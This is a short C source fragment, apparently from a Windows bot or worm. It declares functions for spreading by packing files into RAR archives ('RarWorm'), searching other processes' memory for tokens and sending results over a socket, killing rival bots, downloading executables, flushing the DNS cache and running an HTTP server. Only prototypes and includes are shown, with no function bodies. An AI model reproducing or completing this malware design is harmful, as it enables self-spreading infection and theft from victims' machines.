#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
#include <tlhelp32.h> 
#include <Psapi.h>
#include <windns.h> 
#include <wininet.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib,"psapi.lib") 


BOOL DnsFlushResolverCache();
int Download(char *link,char *exxe);
typedef BOOL(__stdcall *DFRC)(void);
typedef DNS_STATUS(WINAPI *DFRCEA)(LPCSTR);
void MeMSearch(SOCKET sock,char *token[10],unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 ); 
void botkiller(SOCKET sock);
BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes);
	void RandomString(char *dst,int len,BOOL Gen_Numbers);
	DWORD WINAPI RarWorm(LPVOID xvoid);
	HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter);
    DWORD WINAPI Http_Server(LPVOID xVoid);

